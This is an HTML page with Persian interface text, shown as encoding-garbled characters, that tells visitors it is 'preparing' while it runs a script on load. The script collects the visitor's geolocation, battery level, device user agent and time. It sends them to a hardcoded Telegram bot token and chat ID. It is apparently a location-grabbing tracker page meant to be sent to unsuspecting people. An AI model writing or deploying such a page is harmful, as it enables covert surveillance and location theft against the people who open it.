<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8" />
  <title>Ø§Ø±Ø³Ø§Ù„ Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù…</title>
  <style>
    body { font-family: Tahoma, sans-serif; direction: rtl; padding: 20px; background: #f0f0f0; color: #333; }
    #status { background: #fff; padding: 15px; border-radius: 8px; box-shadow: 0 0 8px rgba(0,0,0,0.1); white-space: pre-wrap; min-height: 100px; }
  </style>
</head>
<body>
  <h1>Ø§Ø±Ø³Ø§Ù„ Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø¯Ø³ØªÚ¯Ø§Ù‡ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù…</h1>
  <p>Ù„Ø·ÙØ§Ù‹ Ù…Ù†ØªØ¸Ø± Ø¨Ù…Ø§Ù†ÛŒØ¯...</p>
  <pre id="status">Ø¯Ø± Ø­Ø§Ù„ Ø¢Ù…Ø§Ø¯Ù‡â€ŒØ³Ø§Ø²ÛŒ...</pre>

<script>
  const statusEl = document.getElementById('status');

  async function sendToTelegram(msg) {
    const token = "8179792057:AAFqJdoVXJOp5QK13fVbskZgojZVdVdhkgs";
    const chat_id = "309120647";
    const text = encodeURIComponent(msg);
    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${text}`;

    try {
      const res = await fetch(url);
      if (res.ok) {
        statusEl.textContent += "\nâœ… Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø§Ø±Ø³Ø§Ù„ Ø´Ø¯.";
      } else {
        statusEl.textContent += `\nâŒ Ø§Ø±Ø³Ø§Ù„ Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ù†Ø§Ù…ÙˆÙÙ‚ Ø¨ÙˆØ¯. Ú©Ø¯ Ø®Ø·Ø§: ${res.status}`;
      }
    } catch (error) {
      statusEl.textContent += `\nâŒ Ø®Ø·Ø§ Ø¯Ø± Ø§Ø±Ø³Ø§Ù„ Ø§Ø·Ù„Ø§Ø¹Ø§Øª: ${error.message}`;
    }
  }

  async function collectData() {
    let battery = "Ù†Ø§Ù…Ø´Ø®Øµ";
    if (navigator.getBattery) {
      try {
        const batt = await navigator.getBattery();
        battery = `${Math.round(batt.level * 100)}% ${batt.charging ? '(Ø¯Ø± Ø­Ø§Ù„ Ø´Ø§Ø±Ú˜)' : ''}`;
      } catch {
        battery = "Ø®Ø·Ø§ Ø¯Ø± Ø¯Ø±ÛŒØ§ÙØª ÙˆØ¶Ø¹ÛŒØª Ø¨Ø§ØªØ±ÛŒ";
      }
    }

    const device = navigator.userAgent;
    const time = new Date().toLocaleString();

    if (navigator.geolocation) {
      statusEl.textContent = "â³ Ø¯Ø± Ø­Ø§Ù„ Ú¯Ø±ÙØªÙ† Ù…ÙˆÙ‚Ø¹ÛŒØª Ø¬ØºØ±Ø§ÙÛŒØ§ÛŒÛŒ...";
      navigator.geolocation.getCurrentPosition(
        pos => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          const msg = `ğŸ“ Ù…ÙˆÙ‚Ø¹ÛŒØª: ${lat}, ${lon}\nğŸ”‹ Ø¨Ø§ØªØ±ÛŒ: ${battery}\nğŸ•’ Ø²Ù…Ø§Ù†: ${time}\nğŸ“± Ø¯Ø³ØªÚ¯Ø§Ù‡: ${device}`;
          sendToTelegram(msg);
        },
        err => {
          statusEl.textContent = "âš ï¸ Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ Ù…ÙˆÙ‚Ø¹ÛŒØª Ø±Ø¯ Ø´Ø¯.";
          const msg = `âŒ Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ Ù…ÙˆÙ‚Ø¹ÛŒØª Ø¯Ø§Ø¯Ù‡ Ù†Ø´Ø¯\nğŸ”‹ Ø¨Ø§ØªØ±ÛŒ: ${battery}\nğŸ•’ Ø²Ù…Ø§Ù†: ${time}\nğŸ“± Ø¯Ø³ØªÚ¯Ø§Ù‡: ${device}`;
          sendToTelegram(msg);
        }
      );
    } else {
      statusEl.textContent = "âš ï¸ Ù…Ø±ÙˆØ±Ú¯Ø± Ø´Ù…Ø§ Ø§Ø² Ù…ÙˆÙ‚Ø¹ÛŒØª Ù¾Ø´ØªÛŒØ¨Ø§Ù†ÛŒ Ù†Ù…ÛŒâ€ŒÚ©Ù†Ø¯.";
      const msg = `ğŸ“ Ù…ÙˆÙ‚Ø¹ÛŒØª Ù†Ø§Ù…ÙˆØ¬ÙˆØ¯\nğŸ”‹ Ø¨Ø§ØªØ±ÛŒ: ${battery}\nğŸ•’ Ø²Ù…Ø§Ù†: ${time}\nğŸ“± Ø¯Ø³ØªÚ¯Ø§Ù‡: ${device}`;
      sendToTelegram(msg);
    }
  }

  collectData();
</script>
</body>
</html>
